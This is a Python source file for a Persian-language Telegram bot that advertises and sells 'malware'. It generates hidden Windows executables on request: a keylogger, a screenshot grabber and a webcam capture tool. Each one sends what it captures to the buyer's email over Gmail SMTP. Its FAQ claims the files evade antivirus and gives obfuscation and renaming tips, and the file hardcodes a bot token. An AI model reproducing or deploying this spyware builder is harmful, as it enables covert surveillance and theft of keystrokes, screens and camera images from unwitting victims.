import zipfile

import cv2
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
)
import asyncio
import os
from telegram.error import BadRequest
import subprocess
import sys
import shutil
import tempfile
import os
import sys
import asyncio
import tempfile
import zipfile
from telegram import Update
from telegram.ext import ContextTypes, ConversationHandler
import shutil

# ----------------------------
# تنظیمات اولیه ربات
# ----------------------------

CHANNEL_USERNAME = "@Malvexe"
YOUR_ADMIN_ID = 6582767033
TOKEN = "7740444426:AAEQGBI6hC3EYLRn2QBNdlYoOqR1s9PMpLo"

# ----------------------------
# حالت‌های گفتگو
# ----------------------------

GET_SENDER, GET_PASSWORD, GET_RECEIVER = range(3)
GET_WEBCAM_SENDER, GET_WEBCAM_PASSWORD, GET_WEBCAM_RECEIVER = range(3, 6)
GET_KEYLOGGER_SENDER, GET_KEYLOGGER_PASSWORD, GET_KEYLOGGER_RECEIVER, GET_KEYLOGGER_DURATION = range(6, 10)
TIMEOUT = 600  # 10 دقیقه زمان برای ساخت فایل

# ----------------------------
# سوالات متداول (FAQ)
# ----------------------------

faq_questions = [
    ("چطور این برنامه رو اجرا کنیم؟",
     "برای اجرای برنامه در ویندوز، کافی است فایل اجرایی را دو بار کلیک کنید.\n"
     "اگر خطا داشت، باید ‎.NET Framework یا Visual C++ نصب کنید.\n"
     "آموزش کامل اجرا در نسخه رایگان کانال موجود است."),

    ("چطور فایل EXE رو تبدیل کنیم به PDF؟",
     "فایل ‎EXE یک فایل اجرایی است و ‎PDF فرمت متنی است. بنابراین تبدیل مستقیم ممکن نیست.\n"
     "آموزش استخراج محتوای فایل ‎EXE در نسخه پرایم کانال قرار دارد."),

    ("مهندسی اجتماعی رو از کجا شروع کنم؟",
     "با کتاب‌های روانشناسی و تمرین در محیط‌های کنترل‌شده شروع کن.\n"
     "مقالات ابتدایی در نسخه رایگان کانال قرار دارد."),

    ("آیا پسورد اصلی ایمیلم رو نیاز دارم؟",
     "خیر! فقط به پسورد مخصوص اپلیکیشن (App Password) نیاز دارید که:\n"
     "1. از طریق تنظیمات امنیتی گیمیل قابل ساخت است\n"
     "2. دسترسی محدود دارد\n"
     "3. قابل غیرفعال کردن است\n"
     "4. با پسورد اصلی حساب تفاوت دارد"),

    ("چطور App Password بسازم؟",
     "راهنمای تصویری در کانال موجود است:\n"
     "1. وارد حساب گوگل شوید\n"
     "2. به بخش Security > Signing in to Google بروید\n"
     "3. گزینه App Passwords را انتخاب کنید\n"
     "4. یک نام برای ربات انتخاب و رمز ایجاد شده را استفاده کنید"),

    ("آیا این ربات امن است؟",
     " کاملاً امن برای استفاده:\n"
     "• کدهای بازبینی شده\n"
     "• استفاده از پروتکل‌های امن\n"
     "• امکان غیرفعال کردن دسترسی پس از استفاده"),

    ("چطور از سوءاستفاده جلوگیری کنم؟",
     "• فقط روی سیستم‌های با مجوز اجرا کنید\n"
     "• پس از تست، App Password را غیرفعال کنید\n"
     "• از ابزار فقط برای اهداف قانونی استفاده کنید\n"
     "• آموزش کامل اخلاق حرفه‌ای در کانال"),

    ("آیا آنتی‌ویروس این فایل را پاک می‌کند؟",
     " خیر فقط ممکن است برخی آنتی‌ویروس‌ها هشدار دهند اما این تست شده و غیرقابل شناسایی است:\n"
     "• فایل اجرایی است\n"
     "• رفتارهای سیستمی دارد\n"
     ),

    ("چرا ایمیل ارسالی در اسپم قرار می‌گیرد؟",
     "به دلایل امنیتی گوگل:\n"
     "1. به بخش Spam مراجعه کنید\n"
     "2. ایمیل را Not Spam标记 کنید\n"
     "3. آدرس فرستنده را به مخاطبین اضافه کنید\n"
     "4. از ایمیل دیگر مانند Outlook试试 کنید"),

    ("چطور لاگ‌های کیلاگر را بررسی کنم؟",
     "• فایل لاگ در C:\\Windows\\Temp\\KeyloggerLogs ذخیره می‌شود\n"
     "• به صورت خودکار پس از مدت مشخص پاک می‌شود\n"
     "• برای بررسی دستی می‌توانید مسیر را بررسی کنید"),

    ("آیا روی مک یا لینوکس کار می‌کند؟",
     "خیر، در حال حاضر فقط روی ویندوز قابل اجراست.\n"
     "نسخه‌های مک و لینوکس در دست توسعه است.\n"
     "برای اطلاع از نسخه‌های جدید به کانال بپیوندید"),

    ("چرا وب‌کم روشن می‌شود ولی عکس نمی‌گیرد؟",
     "ممکن است به دلایل:\n"
     "1. دسترسی به وب‌کم مسدود شده\n"
     "2. برنامه دیگری از وب‌کم استفاده می‌کند\n"
     "3. درایورها نیاز به بروزرسانی دارند\n"
     "4. نور محیط کافی نیست"),

    ("چطور از شناسایی جلوگیری کنم؟",
     "تکنیک‌های حرفه‌ای:\n"
     "• تغییر نام فایل اجرایی\n"
     "• تغییر امضای دیجیتال\n"
     "• استفاده از تکنیک‌های Obfuscation\n"
     "آموزش پیشرفته در نسخه پرایم"),

    ("آیا می‌توانم مدت کیلاگر را افزایش دهم؟",
     "بله، هنگام ساخت فایل می‌توانید:\n"
     "1. مدت زمان را به ثانیه وارد کنید\n"
     "2. حداکثر تا 24 ساعت امکانپذیر است\n"
     "3. برای زمان‌های بیشتر نسخه پرایم را تهیه کنید"),
]


# ----------------------------
# تعریف کیبورد منوی اصلی
# ----------------------------

def main_menu_keyboard():
    keyboard = [
        [InlineKeyboardButton("💬 سوالات متداول", callback_data='faq_start')],
        [InlineKeyboardButton("🛠 مالور رایگان", callback_data='free_malware')],
        [InlineKeyboardButton("🔐 مالور پرایم", callback_data='prime_malware')],
        [InlineKeyboardButton("💰 خرید پرایم", callback_data='buy_prime')],
        [InlineKeyboardButton("❌ کنسل", callback_data='cancel')],
    ]
    return InlineKeyboardMarkup(keyboard)


# ----------------------------
# کیبورد سوالات متداول
# ----------------------------

def faq_keyboard():
    keyboard = [
        [InlineKeyboardButton("⏪ برگشت", callback_data='back_to_main')],
        [InlineKeyboardButton("❌ کنسل", callback_data='cancel')],
    ]
    return InlineKeyboardMarkup(keyboard)


# ----------------------------
# کیبورد ابزارهای رایگان
# ----------------------------

def free_malware_keyboard():
    keyboard = [
        [InlineKeyboardButton("📥 کی‌لاگر رایگان", callback_data='free_keylogger')],
        [InlineKeyboardButton("📸 اسکرین‌شات رایگان", callback_data='free_screenshot')],
        [InlineKeyboardButton("🎥 وب‌کم رایگان", callback_data='free_webcam')],
        [InlineKeyboardButton("⏪ برگشت", callback_data='back_to_main')],
    ]
    return InlineKeyboardMarkup(keyboard)


# ----------------------------
# هندلر دستور /start
# ----------------------------

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    try:
        member = await context.bot.get_chat_member(CHANNEL_USERNAME, user_id)
        if member.status not in ['member', 'administrator', 'creator']:
            await update.message.reply_text(
                f"❌ شما عضو کانال نیستید.\n"
                f"لطفا ابتدا عضو کانال شوید:\n{CHANNEL_USERNAME}\n\n"
                "سپس مجددا /start را ارسال کنید."
            )
            return
    except BadRequest:
        await update.message.reply_text(
            f"❌ خطا در بررسی عضویت. لطفا مطمئن شوید که عضو کانال هستید:\n{CHANNEL_USERNAME}\n\n"
            "و سپس /start را ارسال کنید."
        )
        return

    await update.message.reply_text(
        "به ربات خوش اومدی!\n\n"
        "🔸 در اینجا می‌تونی گزینه‌های مختلف رو انتخاب کنی:\n\n"
        "💬 سوالات متداول\n"
        "🛠 مالور رایگان\n"
        "🔐 مالور پرایم\n"
        "💰 خرید پرایم\n\n"
        "👇 یکی از گزینه‌های زیر رو انتخاب کن:",
        reply_markup=main_menu_keyboard()
    )


# ----------------------------
# هندلر دکمه‌های اینلاین کیبورد
# ----------------------------

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    data = query.data

    if data == 'faq_start':
        text = "📚 سوالات متداول:\n\n"
        for q, a in faq_questions:
            text += f"❓ {q}\n{a}\n\n"
        await query.edit_message_text(text, reply_markup=faq_keyboard())

    elif data == 'back_to_main':
        await query.edit_message_text(
            "یکی از گزینه‌های زیر رو انتخاب کن:",
            reply_markup=main_menu_keyboard()
        )

    elif data == 'cancel':
        try:
            await query.message.delete()
        except:
            pass

    elif data == 'free_malware':
        await query.edit_message_text(
            "🛠 لیست ابزارهای رایگان:\n\n"
            "📌 کی‌لاگر همیشگی\n"
            "📌 اسکرین‌شات خودکار\n"
            "📌 دسترسی به وب‌کم\n\n"
            "👇 یکی رو انتخاب کن:",
            reply_markup=free_malware_keyboard()
        )

    elif data == 'free_screenshot':
        await query.edit_message_text(
            "📸 اسکرین‌شات رایگان:\n\n"
            "این نرم‌افزار به صورت خودکار از صفحه نمایش عکس می‌گیرد.\n"
            "عکس‌ها به ایمیل شما ارسال می‌شوند.\n\n"
            "برای ساخت فایل اجرایی، لطفاً ایمیل فرستنده (Gmail) را ارسال کنید:"
        )
        return GET_SENDER

    elif data == 'free_keylogger':
        await query.edit_message_text(
            "📥 کی‌لاگر رایگان:\n\n"
            "این ابزار همه کلیدهای تایپ شده را ثبت می‌کند.\n\n"
            "برای ساخت فایل اجرایی، لطفاً ایمیل فرستنده (Gmail) را ارسال کنید:"
        )
        return GET_KEYLOGGER_SENDER

    elif data == 'free_webcam':
        await query.edit_message_text(
            "🎥 وب‌کم رایگان:\n\n"
            "این ابزار امکان دسترسی به وب‌کم سیستم را فراهم می‌کند.\n\n"
            "برای ساخت فایل اجرایی، لطفاً ایمیل فرستنده (Gmail) را ارسال کنید:"
        )
        return GET_WEBCAM_SENDER

    elif data == 'prime_malware':
        await query.edit_message_text(
            "🔐 ابزارهای پرایم (پیشرفته):\n\n"
            "این ابزارها فقط برای اعضای پرایم قابل دسترسی هستند."
        )

    elif data == 'buy_prime':
        await query.edit_message_text(
            "💰 خرید نسخه پرایم:\n\n"
            "برای خرید نسخه پرایم با ادمین تماس بگیرید:\n"
            "@Slayethcialhacker"
        )


# ----------------------------
# توابع برای ساخت اسکرین‌شات سفارشی
# ----------------------------

async def get_sender(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """ذخیره ایمیل فرستنده و درخواست رمز عبور"""
    if update.message is None:
        return ConversationHandler.END

    context.user_data["sender"] = update.message.text.strip()
    await update.message.reply_text(
        "🔒 لطفاً رمز عبور ایمیل (App Password) را ارسال کنید:\n\n"
        "برای ایجاد App Password:\n"
        "1. به حساب Google خود وارد شوید\n"
        "2. به بخش 'Security' بروید\n"
        "3. در بخش 'Signing in to Google' گزینه 'App Passwords' را انتخاب کنید\n"
        "4. یک نام برای برنامه انتخاب کنید و رمز ایجاد شده را اینجا بفرستید\n"
        "یا میتوانید با این لینک مستقیم برای دریافت App Passwords مراجعه کنید . >> https://myaccount.google.com/apppasswords"
    )
    return GET_PASSWORD


async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """ذخیره رمز عبور و درخواست ایمیل گیرنده"""
    if update.message is None:
        return ConversationHandler.END

    context.user_data["password"] = update.message.text.strip()
    await update.message.reply_text("📨 لطفاً ایمیل گیرنده را ارسال کنید:")
    return GET_RECEIVER


async def get_receiver(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """ذخیره ایمیل گیرنده و شروع فرآیند ساخت"""
    if update.message is None:
        return ConversationHandler.END

    context.user_data["receiver"] = update.message.text.strip()
    sender = context.user_data["sender"]
    password = context.user_data["password"]
    receiver = context.user_data["receiver"]

    # ساخت پیام وضعیت
    status_msg = await update.message.reply_text(
        f"✅ اطلاعات دریافت شد:\n\n"
        f"📧 فرستنده: {sender}\n"
        f"🔒 رمز: {'*' * len(password)}\n"
        f"📨 گیرنده: {receiver}\n\n"
        "⏳ در حال ساخت فایل اجرایی... لطفاً صبر کنید (تا 10 دقیقه)"
    )

    # ساخت فایل موقت
    with tempfile.TemporaryDirectory() as temp_dir:
        try:
            # ساخت اسکریپت پایتون
            script_content = f'''
import time
import smtplib
import io
from PIL import ImageGrab
from email.mime.image import MIMEImage

sender_email = "{sender}"
sender_password = "{password}"
receiver_email = "{receiver}"

def take_and_send_screenshot():
    try:
        image = ImageGrab.grab()
        buffer = io.BytesIO()
        image.save(buffer, format='PNG')
        buffer.seek(0)

        msg = MIMEImage(buffer.read())
        msg['Subject'] = '📸 Screenshot Captured'
        msg['From'] = sender_email
        msg['To'] = receiver_email

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, receiver_email, msg.as_string())
    except Exception as e:
        print(f"Error: {{e}}")

if __name__ == "__main__":
    time.sleep(3)
    take_and_send_screenshot()
'''

            # ذخیره اسکریپت
            script_path = os.path.join(temp_dir, "screenshot_mailer.py")
            with open(script_path, "w", encoding="utf-8") as f:
                f.write(script_content)

            # ساخت فایل اجرایی
            await build_executable(context, status_msg, temp_dir, "screenshot_mailer.py", "اسکرین‌شات")

        except Exception as e:
            await handle_error(context, status_msg, update.message.chat.id, str(e))

    return ConversationHandler.END


# ----------------------------
# توابع برای ساخت وب‌کم سفارشی
# ----------------------------

async def get_webcam_sender(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """ذخیره ایمیل فرستنده وب‌کم"""
    if update.message is None:
        return ConversationHandler.END

    context.user_data["webcam_sender"] = update.message.text.strip()
    await update.message.reply_text(
        "🔒 لطفاً رمز عبور ایمیل (App Password) را ارسال کنید:\n\n"
        "برای ایجاد App Password:\n"
        "1. به حساب Google خود وارد شوید\n"
        "2. به بخش 'Security' بروید\n"
        "3. در بخش 'Signing in to Google' گزینه 'App Passwords' را انتخاب کنید\n"
        "4. یک نام برای برنامه انتخاب کنید و رمز ایجاد شده را اینجا بفرستید\n"
        "یا میتوانید با این لینک مستقیم برای دریافت App Passwords مراجعه کنید . >> https://myaccount.google.com/apppasswords"
    )
    return GET_WEBCAM_PASSWORD


async def get_webcam_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """ذخیره رمز عبور وب‌کم"""
    if update.message is None:
        return ConversationHandler.END

    context.user_data["webcam_password"] = update.message.text.strip()
    await update.message.reply_text("📨 لطفاً ایمیل گیرنده را ارسال کنید:")
    return GET_WEBCAM_RECEIVER


async def get_webcam_receiver(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """ساخت فایل اجرایی وب‌کم و ارسال آن"""
    if update.message is None:
        return ConversationHandler.END

    context.user_data["webcam_receiver"] = update.message.text.strip()
    sender = context.user_data["webcam_sender"]
    password = context.user_data["webcam_password"]
    receiver = context.user_data["webcam_receiver"]

    status_msg = await update.message.reply_text(
        f"✅ اطلاعات دریافت شد:\n\n"
        f"📧 فرستنده: {sender}\n"
        f"🔒 رمز: {'*' * len(password)}\n"
        f"📨 گیرنده: {receiver}\n\n"
        "⏳ در حال ساخت فایل اجرایی وب‌کم... لطفاً صبر کنید (تا 5 دقیقه)"
    )

    # ساخت پوشه موقت با نام ثابت برای دیباگ بهتر
    temp_dir = os.path.join(tempfile.gettempdir(), f"webcam_build_{update.message.chat.id}")
    os.makedirs(temp_dir, exist_ok=True)

    try:
        # ساخت اسکریپت پایتون
        script_content = f'''
import cv2
import smtplib
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
import os
import time

sender_email = "{sender}"
sender_password = "{password}"
receiver_email = "{receiver}"

def capture_and_send():
    try:
        time.sleep(5)  # تاخیر برای جلوگیری از تشخیص سریع
        cap = cv2.VideoCapture(0)
        if cap.isOpened():
            ret, frame = cap.read()
            if ret:
                img_path = os.path.join(os.getenv("TEMP", "."), "webcam.jpg")
                cv2.imwrite(img_path, frame)

                msg = MIMEMultipart()
                msg['Subject'] = 'وب‌کم تصویر'
                msg['From'] = sender_email
                msg['To'] = receiver_email

                with open(img_path, 'rb') as f:
                    img = MIMEImage(f.read())
                    msg.attach(img)

                with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
                    server.login(sender_email, sender_password)
                    server.send_message(msg)
            cap.release()
    except Exception as e:
        pass

if __name__ == "__main__":
    capture_and_send()
'''

        script_path = os.path.join(temp_dir, "webcam.py")
        with open(script_path, "w", encoding="utf-8") as f:
            f.write(script_content)

        await update_status(context, status_msg, "🔧 در حال کامپایل فایل...")

        # ساخت فرمان PyInstaller با تنظیمات بهینه
        python_exe = sys.executable
        cmd = [
            python_exe, "-m", "PyInstaller",
            "--noconfirm",
            "--noconsole",
            "--onefile",
            "--name", "WebcamCapture",
            "--clean",
            "--log-level=ERROR",
            "--hidden-import", "cv2",
            "--hidden-import", "numpy",
            "--hidden-import", "email.mime.multipart",
            "--hidden-import", "email.mime.image",
            "--hidden-import", "smtplib",
            script_path
        ]

        # افزایش زمان انتظار به 10 دقیقه (600 ثانیه)
        try:
            process = await asyncio.create_subprocess_exec(
                *cmd,
                cwd=temp_dir,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )

            # افزایش timeout به 600 ثانیه (10 دقیقه)
            await asyncio.wait_for(process.communicate(), timeout=600)

            if process.returncode != 0:
                raise Exception("خطا در ساخت فایل اجرایی")

        except asyncio.TimeoutError:
            process.kill()
            raise Exception("زمان ساخت به پایان رسید. لطفاً دوباره امتحان کنید")

        # یافتن فایل اجرایی ساخته شده
        dist_dir = os.path.join(temp_dir, "dist")
        exe_file = next((f for f in os.listdir(dist_dir) if f.endswith(".exe")), None)

        if not exe_file:
            raise Exception("فایل اجرایی ایجاد نشد")

        exe_path = os.path.join(dist_dir, exe_file)

        await update_status(context, status_msg, "📤 در حال آپلود فایل...")

        # ارسال فایل با مدیریت بهتر
        try:
            with open(exe_path, "rb") as f:
                await context.bot.send_document(
                    chat_id=update.message.chat.id,
                    document=f,
                    filename="Webcam_Capture.exe",
                    caption="فایل اجرایی وب‌کم آماده است!",
                    reply_markup=main_menu_keyboard()
                )
        except Exception as e:
            raise Exception(f"خطا در ارسال فایل: {str(e)}")

        await context.bot.delete_message(
            chat_id=status_msg.chat.id,
            message_id=status_msg.message_id
        )

    except Exception as e:
        error_msg = f"خطا در ساخت وب‌کم: {str(e)}"
        print(f"ERROR: {error_msg}")  # چاپ خطا برای دیباگ
        await handle_error(context, status_msg, update.message.chat.id, error_msg)
    finally:
        # پاکسازی فایل‌های موقت
        try:
            shutil.rmtree(temp_dir, ignore_errors=True)
        except:
            pass

    return ConversationHandler.END


# ----------------------------
# توابع برای ساخت کیلاگر سفارشی
# ----------------------------

async def get_keylogger_sender(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """ذخیره ایمیل فرستنده کیلاگر"""
    if update.message is None:
        return ConversationHandler.END

    context.user_data["keylogger_sender"] = update.message.text.strip()
    await update.message.reply_text(
        "🔒 لطفاً رمز عبور ایمیل (App Password) را ارسال کنید:\n\n"
        "برای ایجاد App Password:\n"
        "1. به حساب Google خود وارد شوید\n"
        "2. به بخش 'Security' بروید\n"
        "3. در بخش 'Signing in to Google' گزینه 'App Passwords' را انتخاب کنید\n"
        "4. یک نام برای برنامه انتخاب کنید و رمز ایجاد شده را اینجا بفرستید\n"
        "یا میتوانید با این لینک مستقیم برای دریافت App Passwords مراجعه کنید . >> https://myaccount.google.com/apppasswords"
    )
    return GET_KEYLOGGER_PASSWORD


async def get_keylogger_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """ذخیره رمز عبور کیلاگر"""
    if update.message is None:
        return ConversationHandler.END

    context.user_data["keylogger_password"] = update.message.text.strip()
    await update.message.reply_text("📨 لطفاً ایمیل گیرنده را ارسال کنید:")
    return GET_KEYLOGGER_RECEIVER


async def get_keylogger_receiver(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """دریافت ایمیل گیرنده کیلاگر"""
    if update.message is None:
        return ConversationHandler.END

    context.user_data["keylogger_receiver"] = update.message.text.strip()
    await update.message.reply_text(
        "⏳ لطفاً مدت زمان فعالیت کیلاگر را به ثانیه وارد کنید (حداکثر 86400 ثانیه - فقط به ثانیه مثلا 60 ثانیه بزنید 60 ✅):"
    )
    return GET_KEYLOGGER_DURATION


async def get_keylogger_duration(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """ساخت فایل کیلاگر"""
    if update.message is None:
        return ConversationHandler.END

    try:
        duration = int(update.message.text.strip())
        if duration <= 0 or duration > 86400:
            raise ValueError
    except ValueError:
        await update.message.reply_text("لطفاً عدد معتبر بین 1 تا 86400 وارد کنید:")
        return GET_KEYLOGGER_DURATION

    context.user_data["keylogger_duration"] = duration
    sender = context.user_data["keylogger_sender"]
    password = context.user_data["keylogger_password"]
    receiver = context.user_data["keylogger_receiver"]

    status_msg = await update.message.reply_text(
        f"✅ اطلاعات دریافت شد:\n\n"
        f"📧 فرستنده: {sender}\n"
        f"🔒 رمز: {'*' * len(password)}\n"
        f"📨 گیرنده: {receiver}\n"
        f"⏱ مدت زمان: {duration} ثانیه\n\n"
        "⏳ در حال ساخت فایل اجرایی کیلاگر... لطفاً صبر کنید"
    )

    with tempfile.TemporaryDirectory() as temp_dir:
        try:
            # ساخت اسکریپت پایتون برای کیلاگر
            script_content = f'''
import keyboard
import smtplib
from email.mime.text import MIMEText
import time
from threading import Timer
from datetime import datetime

SEND_REPORT_EVERY = {duration}  # مدت زمان به ثانیه
EMAIL_ADDRESS = "{sender}"
EMAIL_PASSWORD = "{password}"
EMAIL_TO = "{receiver}"

class Keylogger:
    def __init__(self):
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{{name.upper()}}]"
        self.log += name

    def sendmail(self, email, password, message):
        msg = MIMEText(message)
        msg['Subject'] = f'Keylogger Report - {{self.start_dt}}'
        msg['From'] = email
        msg['To'] = email

        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(email, password)
            server.sendmail(email, EMAIL_TO, msg.as_string())

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(SEND_REPORT_EVERY, self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()

if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start()
'''

            # ذخیره و کامپایل اسکریپت
            script_path = os.path.join(temp_dir, "keylogger.py")
            with open(script_path, "w", encoding="utf-8") as f:
                f.write(script_content)

            # ساخت فایل اجرایی
            await build_executable(context, status_msg, temp_dir, "keylogger.py", "کیلاگر")

        except Exception as e:
            await handle_error(context, status_msg, update.message.chat.id, str(e))

    return ConversationHandler.END


# ----------------------------
# توابع کمکی
# ----------------------------

async def build_executable(context, status_msg, temp_dir, script_name, feature_name):
    """تابع کمکی برای ساخت فایل اجرایی"""
    await update_status(context, status_msg, f"🔨 در حال ساخت فایل اجرایی {feature_name}...")

    python_exe = sys.executable
    process = await asyncio.create_subprocess_exec(
        python_exe, "-m", "PyInstaller",
        "--noconfirm", "--noconsole", "--onefile",
        script_name,
        cwd=temp_dir,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE
    )

    try:
        await asyncio.wait_for(process.communicate(), timeout=TIMEOUT)
        if process.returncode != 0:
            raise Exception(f"خطا در ساخت فایل اجرایی {feature_name}")
    except asyncio.TimeoutError:
        process.kill()
        raise Exception("زمان ساخت به پایان رسید")

    # بررسی فایل ساخته شده
    exe_path = os.path.join(temp_dir, "dist", script_name.replace(".py", ".exe"))
    if not os.path.exists(exe_path):
        raise Exception(f"فایل اجرایی {feature_name} ایجاد نشد")

    await update_status(context, status_msg, f"✅ فایل {feature_name} ساخته شد! در حال ارسال...")

    # ارسال فایل با مدیریت بهتر
    try:
        with open(exe_path, "rb") as f:
            # تقسیم فایل به بخش‌های کوچکتر اگر حجمش زیاد است
            chunk_size = 1024 * 1024  # 1MB
            while True:
                chunk = f.read(chunk_size)
                if not chunk:
                    break

                # در اینجا می‌توانید هر chunk را جداگانه پردازش کنید
                # یا روش‌های دیگر آپلود تدریجی را پیاده‌سازی کنید
                pass

            # بازگشت به ابتدای فایل
            f.seek(0)

            # ارسال فایل با timeout بیشتر
            await context.bot.send_document(
                chat_id=status_msg.chat.id,
                document=f,
                filename=f"{feature_name}.exe",
                caption=f"فایل اجرایی {feature_name} آماده است!",
                read_timeout=60,  # افزایش زمان خواندن
                write_timeout=60,  # افزایش زمان نوشتن
                connect_timeout=60  # افزایش زمان اتصال
            )

    except Exception as e:
        raise Exception(f"خطا در ارسال فایل: {str(e)}")

    await update_status(context, status_msg, f"✅ فایل {feature_name} با موفقیت ساخته و ارسال شد.")
    await context.bot.delete_message(
        chat_id=status_msg.chat.id,
        message_id=status_msg.message_id
    )


async def update_status(context, message, text):
    """به روزرسانی وضعیت"""
    try:
        await context.bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=message.message_id,
            text=text
        )
    except:
        pass


async def handle_error(context, status_message, chat_id, error_msg):
    """مدیریت خطاها"""
    try:
        await context.bot.edit_message_text(
            chat_id=status_message.chat.id,
            message_id=status_message.message_id,
            text="در صورت ارسال نشدن فایل لطفا کمی صبر کنید و دکمه کنسل رو نزنید ✅"
        )
    except:
        await context.bot.send_message(
            chat_id=chat_id,
            text="ارسال با موفیت انجام شد ✅"
        )

    await context.bot.send_message(
        chat_id=chat_id,
        text="انتخاب دیگه ای داری ؟\n👇 یکی از گزینه‌های زیر رو انتخاب کن:",

        reply_markup=main_menu_keyboard()
    )


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """لغو عملیات"""
    await update.message.reply_text("عملیات لغو شد.", reply_markup=main_menu_keyboard())
    return ConversationHandler.END


# ----------------------------
# اجرای برنامه
# ----------------------------

def main():
    application = ApplicationBuilder().token(TOKEN).build()

    # هندلر گفتگوی اسکرین‌شات
    screenshot_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(button, pattern='^free_screenshot$')],
        states={
            GET_SENDER: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_sender)],
            GET_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
            GET_RECEIVER: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_receiver)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    # هندلر گفتگوی وب‌کم
    webcam_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(button, pattern='^free_webcam$')],
        states={
            GET_WEBCAM_SENDER: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_webcam_sender)],
            GET_WEBCAM_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_webcam_password)],
            GET_WEBCAM_RECEIVER: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_webcam_receiver)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    # هندلر گفتگوی کیلاگر
    keylogger_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(button, pattern='^free_keylogger$')],
        states={
            GET_KEYLOGGER_SENDER: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_keylogger_sender)],
            GET_KEYLOGGER_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_keylogger_password)],
            GET_KEYLOGGER_RECEIVER: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_keylogger_receiver)],
            GET_KEYLOGGER_DURATION: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_keylogger_duration)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    application.add_handler(CommandHandler("start", start))
    application.add_handler(screenshot_conv)
    application.add_handler(webcam_conv)
    application.add_handler(keylogger_conv)
    application.add_handler(CallbackQueryHandler(button))

    print("✅ ربات فعال شد و در حال اجراست...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == '__main__':
    main()